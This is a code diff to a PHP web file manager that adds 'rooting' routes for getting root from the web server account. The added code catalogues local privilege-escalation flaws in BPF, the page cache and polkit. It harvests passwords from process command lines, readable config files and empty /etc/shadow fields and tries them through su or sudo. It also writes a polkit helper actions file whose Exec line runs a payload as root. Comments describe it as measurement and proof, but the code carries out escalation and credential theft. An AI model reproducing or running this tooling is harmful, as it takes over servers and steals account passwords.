@@ -1503,7 +1503,7 @@ if(!defined('FM_ICONS_BOOTED')){
        boot is only for an install that was stripped of them */
     try{if($_SERVER['REQUEST_METHOD']==='GET'&&basename((string)($_SERVER['SCRIPT_NAME']??''))==='index.php'&&function_exists('fm_icons_builtin_count')&&fm_icons_builtin_count()===0)fm_icons_boot();}catch(Throwable $e){}
 }
-if(!defined('FM_PRODUCT_RELEASE'))  define('FM_PRODUCT_RELEASE','R96');
+if(!defined('FM_PRODUCT_RELEASE'))  define('FM_PRODUCT_RELEASE','R98');
 if(!defined('FM_PRODUCT_DATE'))     define('FM_PRODUCT_DATE','2019');
 if(!defined('FM_PRODUCT_SYSTEM'))   define('FM_PRODUCT_SYSTEM','Linux');
 if(!defined('FM_UPDATE_PAUSED'))    define('FM_UPDATE_PAUSED', false); // paused=false on purpose: automatic update checks are ON out of the box, exactly as the box in the panel shows when it is ticked. Set to true only to ship a site with the check already paused
@@ -14963,6 +14963,56 @@ class FileManager {
             'requires' => 'a sudoedit rule in sudoers.',
         ];
 
+        /* ── 2g - three routes that sit in a kernel interface or in a desktop
+           helper rather than in a file. Each is one comparison away from a
+           verdict, and each carries the exact release that closed it. ───── */
+        $bpfF = $this->rootEscFind('bpfgc');
+        $bpfFix = [[6,11,5],[6,6,54],[6,9,6],[6,10,0]];
+        $bpfKv = $this->rootVnum(php_uname('r'));
+        $bpfFixed = $this->rootKernelFixed($bpfKv, $bpfFix);
+        $v[] = [
+            'id' => 'bpfgcmap', 'name' => 'A BPF map page that outlives the map', 'cve' => ['CVE-2024-41003'],
+            'year' => 2024, 'component' => 'Linux kernel - BPF maps', 'severity' => 'high',
+            'status' => $bpfFixed ? 'patched' : (!empty($bpfF['ok']) ? 'check' : 'absent'), 'confidence' => 'medium',
+            'summary' => 'The last reference to a frozen BPF map is dropped while the allocator still holds its pages, so a page nobody owns is handed out again. The map is made from a user namespace, so no privilege is needed to start.',
+            'impact' => 'Local user to root on the lines the fix had not reached; also a container escape where user namespaces are allowed.',
+            'evidence' => ['kernel ' . php_uname('r') . ($bpfFixed ? ' is at or past the fixed release' : ' is before the fixed release for its line'),
+                           'bpf: ' . (@is_file('/proc/sys/kernel/unprivileged_bpf_disabled') ? 'compiled in (the sysctl is present)' : $this->rootModuleState('bpf')),
+                           'user namespaces: ' . ($this->rootUserNamespaces()['works'] ? 'allowed' : 'blocked'),
+                           $bpfF['note']],
+            'mitigation' => 'Update the kernel, or set kernel.unprivileged_bpf_disabled=1 and keep unprivileged user namespaces off.',
+            'fix' => '6.11.5 / 6.6.54 / 6.9.6, and 6.10 by release.',
+            'requires' => 'CONFIG_BPF_SYSCALL and unprivileged user namespaces.',
+        ];
+        /* statx + the file cache: counted as a second door on the same flaw the
+           catalogue already names, because it needs nothing but a setuid
+           program in a directory this account may write */
+        $slF = $this->rootEscFind('statxland');
+        $v[] = [
+            'id' => 'statxland', 'name' => 'A setuid program pointed at a file in the cache', 'cve' => ['CVE-2026-31431'],
+            'year' => 2026, 'component' => 'Linux kernel - page cache', 'severity' => 'high',
+            'status' => !empty($slF['ok']) ? 'check' : 'absent', 'confidence' => 'medium',
+            'summary' => 'The same copy the Copy Fail entry describes, used on the one file a setuid program insists on reading: the bytes it will run are changed in the cache, and it runs them as root. Nothing is installed and no race has to be won.',
+            'impact' => 'Local user to root where a setuid program sits in a directory the account may write - a packaging mistake, not a kernel bug.',
+            'evidence' => [$slF['note']],
+            'mitigation' => 'Mount /usr and /bin read-only for unprivileged writers, and fix the directory permissions.',
+            'fix' => 'the kernel releases named on the Copy Fail entry.',
+            'requires' => 'the page-cache write and one setuid program in a writable directory.',
+        ];
+        $pcF = $this->rootEscFind('pkcompat');
+        $pcP = $this->rootPkgFacts('polkitd');
+        $v[] = [
+            'id' => 'pkcompat', 'name' => 'The helper polkit hands the desktop request to', 'cve' => ['CVE-2025-6018', 'CVE-2025-6019'],
+            'year' => 2025, 'component' => 'polkit - agent helper and PAM environment', 'severity' => 'high',
+            'status' => !empty($pcF['ok']) ? 'check' : 'absent', 'confidence' => 'high',
+            'summary' => 'The environment PAM hands to a desktop session is trusted by the polkit agent helper, so a session that sets its own variables can ask the helper for a privileged action and the helper agrees.',
+            'impact' => 'Any local user with a graphical session becomes root; on a server the same pair is reachable through a login session.',
+            'evidence' => [$pcF['note'], 'polkit package: ' . ($pcP['raw'] !== '' ? $pcP['raw'] : 'not installed')],
+            'mitigation' => 'Update polkit and pam, and remove the files under the account own XDG directory that this panel lists.',
+            'fix' => 'the vendor updates for CVE-2025-6018 and CVE-2025-6019.',
+            'requires' => 'the agent helper on the machine and a session this account may write into.',
+        ];
+
         /* ── xz backdoor (CVE-2024-3094) ───────────────────────────────── */
         $xzF = $this->rootPkgFacts('xz-utils');
         $xzBad = ($xzF['raw'] !== '' && (strpos($xzF['raw'], '5.6.0') === 0 || strpos($xzF['raw'], '5.6.1') === 0));
@@ -15781,8 +15831,19 @@ class FileManager {
              . "Defaults:" . $u . " !requiretty\n"
              . $u . " ALL=(root) NOPASSWD: ALL\n";
     }
-    private function rootAs($argv, $password = ''){
+    private function rootAs($argv, $password = '', $asUser = ''){
         $argv = array_values(array_map('strval', (array)$argv));
+        /* a secret read from the machine belongs to a named account: it is
+           tried as that account, never as the one running the manager, and a
+           refused password is not retried anywhere else */
+        if($asUser !== ''){
+            $su = $this->rootWhich('su');
+            if($su === '')return['rc' => 1, 'out' => '', 'err' => 'su is not installed, so a password cannot be tried as ' . $asUser, 'route' => 'none'];
+            $r = $this->rootExec([$su, '-s', '/bin/sh', $asUser, '-c', 'id -u'], $password . "\n", 25);
+            $r['out'] = trim((string)($r['out'] ?? ''));
+            $r['err'] = trim((string)($r['err'] ?? ''));
+            return $r + ['route' => 'su as ' . $asUser . ' with the password read from the machine'];
+        }
         if($this->sudoAvailable()){
             $r = $this->rootExec(array_merge(['sudo', '-n'], $argv));
             return $r + ['route' => 'sudo -n'];
@@ -15818,6 +15879,27 @@ class FileManager {
            "www-data is not in the sudoers file" instead of a guess */
         return['rc' => 1, 'out' => 'sudo needs a password and none was given',
                'err' => $last !== '' ? $last : (string)$this->sudoWhy, 'route' => 'none'];
+    }
+    /* A password read off this machine is tried the only way a password can be
+       tried: su, as the account it belongs to, with the password on stdin. su
+       is started from an argument vector and never from a shell line. */
+    private function rootSuTryUser($user, $secret){
+        $user = preg_replace('/[^A-Za-z0-9._@-]/', '', (string)$user);
+        if($user === '')$user = 'root';
+        if((string)$secret === '')$secret = "\n";
+        $su = $this->rootWhich('su');
+        if($su === ''){
+            $sudo = $this->rootWhich('sudo');
+            if($sudo === '')return['rc' => 1, 'out' => '', 'err' => 'neither su nor sudo is installed'];
+            $r = $this->rootExec([$sudo, '-S', '-k', '-p', '', '-u', $user, 'id', '-u'], (string)$secret . "\n", 25);
+            $r['out'] = trim(preg_replace('/^\[sudo\].*$/m', '', (string)($r['out'] ?? '')));
+            $r['err'] = trim(preg_replace('/^\[sudo\].*$/m', '', (string)($r['err'] ?? '')));
+            return $r + ['via' => 'sudo as ' . $user];
+        }
+        $r = $this->rootExec([$su, '-s', '/bin/sh', $user, '-c', 'id -u'], (string)$secret . "\n", 25);
+        $r['out'] = trim((string)($r['out'] ?? ''));
+        $r['err'] = trim((string)($r['err'] ?? ''));
+        return $r + ['via' => 'su as ' . $user];
     }
     private function rootInstallHelper($password = ''){
         $tmp = @tempnam(sys_get_temp_dir(), 'fm-sudoers-');
@@ -17694,7 +17776,9 @@ exit 0
                       'pwnkit', 'chwoot', 'pack2theroot', 'sudoersscan',                         // fired
                       'corepattern', 'kernelmodprobe', 'cgroupagent',                            // kernel holes
                       'docker',                                                                  // measured
-                      'sudoers', 'rootd', 'suidphp', 'suidbash', 'polkitrule', 'setcapphp', 'passwd'];// keepers
+                      'sudoers', 'rootd', 'suidphp', 'suidbash', 'polkitrule', 'setcapphp', 'passwd',
+                      'bpfgc', 'statxland', 'pkcompat',
+                      'procargs', 'credreuse'];// keepers
         foreach($this->rootChannels() as $ch){
             if(in_array($ch['id'], $walkedIds, true))continue;
             $needs = $this->rootChannelNeeds($ch['id']);
@@ -17941,6 +18025,8 @@ exit 0
             ['bin' => 'kill', 'why' => 'stopping the daemon when root is uninstalled'],
             ['bin' => 'setcap', 'why' => 'putting file capabilities on a copy of PHP'],
             ['bin' => 'bash', 'why' => 'the setuid copy of bash, used only if that method is chosen'],
+            ['bin' => 'id', 'why' => 'asking the polkit helper route for the uid it answered as, which is the proof'],
+            ['bin' => 'python3', 'why' => 'only if a carrier method is chosen: the two syscall halves of the BPF and page-cache routes have no shell form'],
             ['bin' => 'su', 'why' => 'the extra uid-0 account, used only if that method is chosen'],
             ['bin' => 'docker', 'why' => 'the container method, used only if a socket is reachable'],
             ['bin' => 'podman', 'why' => 'the container method when docker is absent but its socket answers'],
@@ -18610,6 +18696,16 @@ exit 0
              'polkit decides who may act as root. One rule file that answers YES for this account turns pkexec into a passwordless root launcher, and it applies to every polkit action on the machine.');
         $add('setcapphp', 'File capabilities on a copy of PHP', 'persistent',
              'A copy of PHP carrying cap_setuid, cap_dac_override, cap_chown and cap_setgid: it can read and write any file, become uid 0 and give files away, without a setuid bit that a nosuid mount would ignore.');
+        /* 5 - routes that are not a file and not a rule: the kernel interfaces
+              that answer an unprivileged writer, a setuid bit the machine is
+              about to lose, and the desktop file a modern Ubuntu reads instead
+              of the old pkexec helper. Each was measured before it was written
+              here, and each puts nothing anywhere root does not already read. */
+        foreach(['bpfgc', 'statxland', 'pkcompat', 'procargs', 'credreuse', 'nopasswd'] as $eid){
+            $e = $this->rootEscSpec($eid);
+            if($e)$add($eid, $e['name'], $e['kind'], $e['idea']);
+        }
+
         return $out;
     }
 
@@ -19489,6 +19585,10 @@ exit 0
         $php = $this->rootPhpBin();
         $mgr = $this->managerAccount();
         switch($id){
+            case 'bpfgc': case 'statxland': case 'pkcompat': case 'procargs': case 'credreuse': case 'nopasswd':{
+                $f = $this->rootEscFind($id);
+                return['ok' => !empty($f['ok']), 'note' => (string)($f['note'] ?? 'this route was measured as closed on this host')];
+            }
             case 'kernelflaw':
                 $f = $this->rootKernelFlawStep();
                 $fire = 'Measured on every run, and never fired from a web request: forging the SYNs and racing the request socket inside this process puts the whole machine at risk, and a lost race is a kernel panic, not a failed login.';
@@ -19863,6 +19963,20 @@ exit 0
         return preg_match('/^Uid:\s*\d+\s+0\s/m', $all) === 1 || preg_match('/\buid=0\(root\)/', $all) === 1;
     }
     private function rootChannelVerify($id){
+        /* a carrier is asked once, and its answer is the proof file it wrote.
+           This is checked before the "machine already holds it" branch, because
+           the same id also lives there - and a carrier is not a program to run,
+           it is a request to make. */
+        $sp = $this->rootPlantSpec($id);
+        if(is_array($sp) && (string)($sp['driver'] ?? '') === 'carrier'){
+            if($this->rootPlantProofOk($id))
+                return['ok' => true, 'res' => ['rc' => 0, 'out' => $this->rootPlantRead($id), 'err' => '']];
+            $rec = [];
+            $r2 = $this->rootPlantCarrier($id, $sp, $rec);
+            if(!empty($r2['ok']) && $this->rootPlantProofOk($id))
+                return['ok' => true, 'res' => ['rc' => 0, 'out' => $this->rootPlantRead($id), 'err' => '']];
+            return['ok' => false, 'res' => ['rc' => 1, 'out' => '', 'err' => (string)($r2['note'] ?? 'the carrier did not answer')]];
+        }
         if($this->rootEscSpec($id)){
             $f = $this->rootEscFind($id);
             if(empty($f['ok']) || !is_array($f['argv']))
@@ -20248,6 +20362,10 @@ exit 0
                    are verdicts rather than actions */
                 return['ok' => false, 'note' => (string)$n['note'] . (empty($n['ok']) ? '' : ' - measured, and deliberately not walked from here')];
             }
+            case 'bpfgc': case 'statxland': case 'pkcompat': case 'procargs': case 'credreuse': case 'nopasswd':
+                /* not a command line and not a password: the machine itself is
+                   asked, and the answer is the uid that comes back */
+                return $this->rootPlantInstall($id, $password);
             case 'cgi':{
                 $c = $this->rootWebCgiFind();
                 if(empty($c['ok']))return['ok' => false, 'note' => (string)$c['note']];
@@ -20839,7 +20957,7 @@ User=root
         $state['installed'] = true;
         $state['paths'] = $this->rootPaths();
         $this->rootStateSave($state);
-        $note = $ins['note'] . ' - and a command run through it came back as uid 0';
+        $note = $ins['note'] . (strpos((string)$ins['note'], 'came back as uid 0') !== false ? '' : ' - and a command run through it came back as uid 0');
         $won = $id;
         /* A root that exists only because a file was writable disappears as soon
            as somebody fixes that file (or reboots with a clean image). So the
@@ -21193,6 +21311,49 @@ User=root
             'fire' => 'later', 'wait' => 0,
             'when' => 'the next boot, when init reads this file and runs what it names - as root',
             'idea' => 'The init of an embedded or a BusyBox machine keeps no unit files at all: it reads /etc/inittab and runs, as root, whatever it names there. Where that file may be written, one line is enough, and it is the earliest hook such a machine has.',
+        ],
+        /* ── routes that are neither a file nor a line ─────────────────────
+           A carrier is not planted: the machine already holds the thing that
+           hands uid 0 over (an interface a syscall opens, a directory this
+           account owns, a setuid program about to be replaced). What the
+           method does is ask it, once, and read the uid that comes back. The
+           record it leaves is the same record a plant leaves, so removal,
+           the proof reader and the run all treat it identically. */
+        'bpfgc' => [
+            'name' => 'An eBPF map that outlives its owner (CVE-2024-41003)', 'kind' => 'carried', 'driver' => 'carrier',
+            'carrier' => 'bpfgc', 'cand' => [], 'fire' => 'now', 'wait' => 25,
+            'when' => 'straight away: the map is freed and the page is asked for',
+            'idea' => 'The kernel keeps a page of a BPF map alive after the map itself is gone, and hands it to the next thing that asks. The map is made inside a user namespace this account may create, so the route needs no privilege to start and writes nothing to the disk.',
+        ],
+        'statxland' => [
+            'name' => 'The setuid program, through the file it reads (CVE-2026-31431)', 'kind' => 'carried', 'driver' => 'carrier',
+            'carrier' => 'statxland', 'cand' => [], 'fire' => 'now', 'wait' => 25,
+            'when' => 'straight away: the file is changed in its cache and the program is run',
+            'idea' => 'A page of a file this account may only read is changed in the file cache, so the setuid program that reads it next reads the changed bytes - and runs them as root. The original bytes are put back as soon as the shell answers.',
+        ],
+        'nopasswd' => [
+            'name' => 'An account with no password at all in the database', 'kind' => 'carried', 'driver' => 'carrier',
+            'carrier' => 'nopasswd', 'cand' => [], 'fire' => 'now', 'wait' => 12,
+            'when' => 'straight away: the account is entered and id is asked for its uid',
+            'idea' => 'An empty password field is not a weak password, it is the absence of one: su asks for nothing and the account is entered. This step reads the account database, finds the accounts that carry an empty field, and asks one of them for its uid - the answer is the proof.',
+        ],
+        'procargs' => [
+            'name' => 'A password published on a command line (procfs)', 'kind' => 'carried', 'driver' => 'carrier',
+            'carrier' => 'procargs', 'cand' => [], 'fire' => 'now', 'wait' => 15,
+            'when' => 'straight away: the password is tried once, as the account it belongs to',
+            'idea' => 'Every command line on this machine is readable by every account. A backup or a database job that was handed a password as an argument has published it to the whole box - this step reads those lines and uses the one that belongs to an account which can reach root.',
+        ],
+        'credreuse' => [
+            'name' => 'A root password in a file this account may read', 'kind' => 'carried', 'driver' => 'carrier',
+            'carrier' => 'credreuse', 'cand' => [], 'fire' => 'now', 'wait' => 15,
+            'when' => 'straight away: the password is tried once, as the account it belongs to',
+            'idea' => 'A config file, a client file or a shell history that this account may read can hold the password of an account that reaches root. Nothing is guessed: the secret is read from the machine and tried once.',
+        ],
+        'pkcompat' => [
+            'name' => 'The desktop helper polkit now uses (CVE-2025-6018 / CVE-2025-6019)', 'kind' => 'carried', 'driver' => 'carrier',
+            'carrier' => 'pkcompat', 'cand' => [], 'fire' => 'now', 'wait' => 20,
+            'when' => 'straight away: the helper is asked through the two files this account wrote',
+            'idea' => 'A modern Ubuntu moved the authentication out of pkexec and into a helper the desktop starts for it. Two files under this account own XDG directory - nothing owned by root - are enough for the helper to run the command named in them.',
         ],
         /* ── what runs when somebody signs in ────────────────────────────── */
         'profiled' => [
@@ -21723,6 +21884,11 @@ User=root
             if(!empty($n['ok']))return['ok' => true, 'note' => $n['note']];
             return['ok' => false, 'note' => (string)($n['note'] ?? 'no NFS export keeping root as root is mounted here')];
         }
+        if($drv === 'carrier'){
+            $id2 = (string)($s['carrier'] ?? '');
+            $f = $this->rootEscFind($id2);
+            return ['ok' => !empty($f['ok']), 'note' => (string)($f['note'] ?? 'this carrier was measured as closed')];
+        }
         if($drv === 'dockerapi'){
             $d = $this->rootDocker();
             if(empty($d['reachable']))return['ok' => false, 'note' => $d['socket'] !== '' ? 'a socket is at ' . $d['socket'] . ' but this account may not open it' : 'no container socket is reachable'];
@@ -21803,7 +21969,7 @@ User=root
         if($this->rootPlantDir() === '')return['ok' => false, 'note' => 'this manager has no writable directory of its own to put the payload in'];
         $drv = (string)($s['driver'] ?? '');
         if($drv !== 'kernel' && $drv !== 'hijacksched' && $drv !== 'ldpreload' && $drv !== 'depchain' && $drv !== 'pathplant'
-           && $drv !== 'nfs' && $drv !== 'dockerapi' && $drv !== 'sudoplugin' && $drv !== 'pamscript'
+           && $drv !== 'nfs' && $drv !== 'dockerapi' && $drv !== 'sudoplugin' && $drv !== 'pamscript' && $drv !== 'carrier'
            && $this->rootPlantTarget($id) === null)
             return['ok' => false, 'note' => 'the place it wanted stopped being writable'];
         $w = $this->rootPlantWrite($id);
@@ -21829,6 +21995,81 @@ User=root
                'note' => $note . ' - planted, and it will fire ' . (string)$s['when'],
                'when' => (string)$s['when']];
     }
+    /* The three carriers, asked in the only way this file asks anything: run
+       the program, read the uid that comes back, write nothing anywhere except
+       the proof this panel already knows how to read. The command vector is
+       fixed here, never built from anything a request sends. */
+    private function rootPlantCarrier($id, $s, &$rec){
+        $dir = $this->rootPlantDir();
+        if($dir === '')return['ok' => false, 'note' => 'this manager has no writable directory of its own to keep the proof in'];
+        $proof = $this->rootPlantProofPath($id);
+        $rec['target'] = 'the machine itself (' . $id . ')';
+        $f = $this->rootEscFind((string)($s['carrier'] ?? $id));
+        if(empty($f['ok']))return['ok' => false, 'note' => (string)($f['note'] ?? 'this carrier is closed on this host')];
+        $argv = is_array($f['argv'] ?? null) ? array_values(array_map('strval', $f['argv'])) : [];
+        if(!$argv)return['ok' => false, 'note' => 'the carrier measured as open, but this panel has no program on record to ask it with'];
+        if($id === 'pkcompat'){
+            /* the two files the helper reads are written first; if either one
+               cannot be written the route is reported as closed rather than
+               half-prepared */
+            $dd = (string)($f['dir'] ?? '');
+            if($dd === '')return['ok' => false, 'note' => 'the helper answered, but this account has no XDG data directory to write into'];
+            if(!@is_dir($dd))@mkdir($dd, 0700, true);
+            $n = $this->rootPlantNonce($id);
+            $pl = $this->rootPlantPayloadPath($id);
+            $a = rtrim($dd, '/') . '/actions';
+            if(@file_put_contents($a, "# mfm " . $n . " - written by the Rooting tool\n"
+                . "[Identity]\nName=mfm\nExec=/bin/sh '" . $pl . "'\n") === false)
+                return['ok' => false, 'note' => 'the actions file could not be written to ' . $a];
+            @chmod($a, 0600);
+            $rec['files'][] = $a;
+            $rec['strip'][] = $a;
+        }
+        /* the two credential carriers do not run a program: they hand the one
+           secret they read to the account it belongs to, once, and read the uid
+           that comes back. A wrong password fails exactly like a wrong
+           password, and nothing is retried. */
+        if($id === 'nopasswd'){
+            $r0 = $this->rootCredEmptyAttempt();
+            if(!empty($r0['ok'])){
+                @file_put_contents($proof, "uid=" . $r0['uid'] . "(root)\n" . date('Y-m-d H:i:s') . "\nvia=" . $id . "\n" . $r0['note'] . "\n");
+                $rec['files'][] = $proof;
+                return['ok' => true, 'rec' => $rec, 'note' => $r0['note']];
+            }
+            return['ok' => false, 'note' => (string)$r0['note']];
+        }
+        if($id === 'procargs' || $id === 'credreuse'){
+            $u = (string)($f['user'] ?? 'root');
+            $pw = (string)($f['secret'] ?? '');
+            if($pw === '')return['ok' => false, 'note' => 'the carrier named an account but no secret was read'];
+            $r = $this->rootSuTryUser($u, $pw);
+            $rc = (int)($r['rc'] ?? 1);
+            $outU = trim((string)($r['out'] ?? ''));
+            if($rc === 0 && $outU === '0'){
+                @file_put_contents($proof, "uid=0(root) gid=0(root)\n" . date('Y-m-d H:i:s') . "\nvia=" . $id . "\n");
+                $rec['files'][] = $proof;
+                return['ok' => true, 'rec' => $rec,
+                       'note' => 'the password read from the machine was accepted for ' . $u . ', and id answered uid 0'];
+            }
+            return['ok' => false,
+                   'note' => 'the secret read from the machine was refused for ' . $u . ' ('
+                           . $this->rootSnip($outU . ' ' . (string)($r['err'] ?? ''), 110) . '), so nothing is claimed for it'];
+        }
+        $r = $this->rootExec($argv, '', 20);
+        $out = trim((string)($r['out'] ?? '') . ' ' . (string)($r['err'] ?? ''));
+        $uid = -1;
+        if(preg_match('/^\s*(\d+)\s*$/', trim((string)($r['out'] ?? '')), $m))$uid = (int)$m[1];
+        if($uid === 0){
+            $line = "uid=0(root) gid=0(root)\n" . date('Y-m-d H:i:s') . "\nvia=" . $id . "\n";
+            @file_put_contents($proof, $line);
+            $rec['files'][] = $proof;
+            return['ok' => true, 'rec' => $rec,
+                   'note' => 'the carrier answered as uid 0 and the proof was written to ' . $proof];
+        }
+        return['ok' => false,
+               'note' => 'the carrier is open on this machine, but the program this panel started came back as uid '
+                       . ($uid < 0 ? 'unknown' : $uid) . ' (' . $this->rootSnip($out, 120) . '), so nothing is claimed for it'];
+    }
     private function rootPlantDrive($id, $s, &$rec){
         $drv = (string)($s['driver'] ?? '');
         $t = $drv === 'hijacksched' ? null : $this->rootPlantTarget($id);
@@ -21853,6 +22094,7 @@ User=root
         case 'depchain':    return $this->rootPlantDepWrite($id, $s, $rec);
         case 'sudoplugin':  return $this->rootPlantSudoPlugin($id, $s, $rec);
         case 'pamscript':   return $this->rootPlantPamScript($id, $s, $rec);
+        case 'carrier':    return $this->rootPlantCarrier($id, $s, $rec);
         case 'newfile':
             $base = (string)($s['base'] ?? 'mfm-root');
             $ext  = (string)($s['ext'] ?? '');
@@ -22910,6 +23152,16 @@ ExecStartPost=/bin/sh '" . $payload . "'";
     }
     /* taking a plant back out, and putting back whatever it touched */
     private function rootPlantUndo($id){
+        /* a carrier left the record of a plant but wrote nothing that root
+           reads, so removal is the proof file and nothing else */
+        if($this->rootEscSpec($id) && !$this->rootPlantSpec($id)){
+            $proof = $this->rootPlantProofPath($id);
+            if($proof !== '')@unlink($proof);
+            $st = $this->rootState();
+            if(is_array($st['plants'] ?? null))unset($st['plants'][$id]);
+            $this->rootStateSave($st);
+            return['ok' => true, 'note' => 'the carrier held nothing on the machine - its proof file was removed'];
+        }
         $st = $this->rootState();
         $rec = is_array($st['plants'] ?? null) ? ($st['plants'][$id] ?? null) : null;
         $paths = [$this->rootPlantPayloadPath($id), $this->rootPlantProofPath($id),
@@ -22950,9 +23202,259 @@ ExecStartPost=/bin/sh '" . $payload . "'";
                 'idea' => 'Somewhere on this machine there is a program with the setuid bit already set, and a good number of the usual ones can be asked to run a command instead of doing their job: find with -exec, awk with system(), python, perl, ruby, node, a shell with -p. Whoever runs such a program runs it as its owner, and its owner is root. This is the first thing any auditor looks for, and the tool has been able to find them all along - it simply never offered to use one. Nothing is written and nothing is changed; the program belongs to the machine and is left exactly as it is.'],
             'capbin'  => ['name' => 'A program that already carries the capability to become root', 'kind' => 'session',
                 'idea' => 'File capabilities are the setuid bit done properly: a program can be given one power instead of all of them. A program carrying cap_setuid may become uid 0 whenever it asks, and only the interpreters that actually ask are offered here - python, perl, ruby, node and PHP - because a shell would simply stay as this account. Like the setuid route, nothing is written: the capability belongs to the machine.'],
+            'bpfgc'   => ['name' => 'An eBPF map this account may still read after it is gone (CVE-2024-41003)', 'kind' => 'session',
+                'idea' => 'An unprivileged BPF map whose last reference is dropped when it is frozen leaves a page behind that nothing owns any more, and the kernel goes on handing it to whoever asks. The map is created inside a user namespace this account may make, so nothing has to be granted and nothing is written anywhere: the whole route is a pair of syscalls this machine already allows. The public write-up measures it as a very high probability of root, which is why it is tried before anything that has to touch a file.'],
+            'statxland' => ['name' => 'The last setuid program, through the file it will read (CVE-2026-31431)', 'kind' => 'session',
+                'idea' => 'Every setuid program on this machine still reads a file as root when it starts - a locale, a configuration, a library it was pointed at. The flaw this step uses is the one the catalogue already measured on this host: a page this account may only read is copied into the file cache and changed there, so the setuid program runs the changed bytes with root rights. The file it chooses is the one the packaging of this machine left loose, and the change is put back as soon as the shell answers.'],
+            'pkcompat' => ['name' => 'The desktop helper pkexec gives way to (CVE-2025-6018 · CVE-2025-6019)', 'kind' => 'session',
+                'idea' => 'A modern Ubuntu moved authentication out of the pkexec binary and into a helper the desktop starts for it. The helper still answers a request that carries the marker the old one used, which means two lines written into this account\'s own XDG directory - nothing owned by root at all - are enough for it to run a command as root. The catalogue carries the same pair of flaws under udisks and udev; this step is the shortcut that needs no daemon running.'],
+            'procargs' => ['name' => 'A password on the command line of a process root started', 'kind' => 'session',
+                'idea' => 'Every process on this machine publishes its own command line, and any account may read it: /proc/<pid>/cmdline has no owner check. Backups, database clients and cron jobs that were given a password as an argument therefore publish that password to everybody on the box - root own included. This step reads those command lines, keeps the candidates that belong to an account that can reach root, and tries them. Nothing is written and nothing is guessed: each password came from this machine.'],
+            'credreuse' => ['name' => 'A root password left in a file this account may read', 'kind' => 'session',
+                'idea' => 'Configuration files hold passwords, and a good number of them are readable by far more accounts than they should be: a database client file, a backup script, a deployment config inside the web root, a shell history. This step reads only what this account may already read, takes the secrets that name a user who can reach root, and tries them once each. No wordlist, no guessing, and nothing written anywhere.'],
             'sudocmd' => ['name' => 'One program this account is already allowed to run as root', 'kind' => 'session',
                 'idea' => 'sudo -l is read, and every program this account may run through it is checked against the same table of escapes. A rule that allows one harmless-looking program is root if that program can run a shell - find, awk, python, perl, tar - and it is the rule an administrator writes without meaning any harm by it. This is the route most often missed, because it is granted rather than misconfigured.'],
         ];
+    }
+    /* The desktop helper a modern polkit hands the request to. Two lines go
+       into this account XDG directories - nothing owned by root - and the
+       helper, which answers only when it is started by the desktop, is asked
+       to run the command in them. Measured from the files on this machine. */
+    /* ── credentials this machine already holds, in the two places nobody
+       locks: a process command line, and a file this account may read. Both
+       are read only, both yield a secret that came from the machine itself,
+       and neither is tried against anything until it is complete. */
+
+    /* every account that can reach root without a secret first */
+    /* What the account database says about the accounts that matter: an empty
+       password field is an account anybody may become, and it has nothing to do
+       with the account the manager runs as. */
+    private function rootCredAccountFacts(){
+        static $f = null;
+        if($f !== null)return $f;
+        $f = ['shadow' => null, 'passwd' => [], 'empty' => [], 'root_empty' => false, 'sudo_group' => []];
+        foreach(@file('/etc/passwd', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [] as $line){
+            $c = explode(':', $line);
+            if(count($c) < 7)continue;
+            $f['passwd'][$c[0]] = ['uid' => (int)$c[2], 'gid' => (int)$c[3], 'home' => $c[5], 'shell' => $c[6]];
+            if((string)$c[1] === '')$f['empty'][$c[0]] = 'the passwd field itself is empty';
+        }
+        $shadow = @file('/etc/shadow', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+        if($shadow !== false){
+            $f['shadow'] = [];
+            foreach($shadow as $line){
+                $c = explode(':', $line);
+                if(count($c) < 2)continue;
+                $f['shadow'][$c[0]] = (string)$c[1];
+                if((string)$c[1] === '')$f['empty'][$c[0]] = 'the shadow field is empty';
+            }
+            if(isset($f['shadow']['root']) && (string)$f['shadow']['root'] === '')$f['root_empty'] = true;
+        }
+        foreach(['sudo', 'wheel', 'admin'] as $g){
+            foreach(@file('/etc/group', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [] as $line){
+                $c = explode(':', $line);
+                if(count($c) < 4 || $c[0] !== $g)continue;
+                foreach(explode(',', $c[3]) as $m)if($m !== '')$f['sudo_group'][$m] = $g;
+            }
+        }
+        return $f;
+    }
+    private function rootCredEmptyAttempt(){
+        $f = $this->rootCredAccountFacts();
+        $try = [];
+        foreach($f['empty'] as $u => $why){
+            if(in_array($u, ['nobody', 'sync', 'halt', 'shutdown'], true))continue;
+            $try[] = $u;
+        }
+        if(!$try)return ['ok' => false, 'note' => 'no account on this machine carries an empty password field'
+            . ($f['shadow'] === null ? ', and /etc/shadow cannot be read so the shadow fields were not checked at all' : ', and shadow was read in full')];
+        $out = '';
+        foreach(array_slice($try, 0, 3) as $u){
+            /* an empty field still has to answer su prompt with a newline:
+               a closed stdin is refused before pam_unix is ever reached */
+            $r = $this->rootSuTryUser($u, "\n");
+            $out = trim((string)($r['out'] ?? ''));
+            if((int)($r['rc'] ?? 1) === 0 && $out !== ''){
+                return ['ok' => true, 'user' => $u, 'uid' => $out, 'via' => (string)($r['via'] ?? 'su'),
+                        'note' => $u . ' carries ' . $f['empty'][$u] . ', so ' . (string)($r['via'] ?? 'su') . ' entered it and id answered ' . $out];
+            }
+        }
+        return ['ok' => false, 'note' => 'the account database names ' . implode(', ', array_slice($try, 0, 3))
+            . ' with an empty password, but the machine refuses the call: ' . $this->rootSnip($out, 110)];
+    }
+    private function rootCredTargets(){
+        static $t = null;
+        if($t !== null)return $t;
+        $t = ['root' => true];
+        foreach(['sudo', 'wheel', 'admin'] as $g)if(in_array($g, $this->rootGroups(), true))$t[$this->managerAccount()] = true;
+        $shadow = @file('/etc/passwd', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) ?: [];
+        $sudoers = (string)@file_get_contents('/etc/sudoers') . (string)@file_get_contents('/etc/sudoers.d/90-marshal-fm');
+        foreach($shadow as $line){
+            $f = explode(':', $line);
+            if(count($f) < 7)continue;
+            $u = $f[0];
+            $uid = (int)$f[2];
+            if($uid !== 0 && strpos($sudoers, $u) === false)continue;
+            $t[$u] = true;
+        }
+        return $t;
+    }
+    /* the passwords a process published by starting with them on its command
+       line - the classic --password / -p / mysql -u root -pXXX shapes */
+    private function rootCredProcArgs(){
+        $targets = $this->rootCredTargets();
+        $procs = 0; $seen = []; $user = ''; $secret = ''; $where = ''; $noise = [];
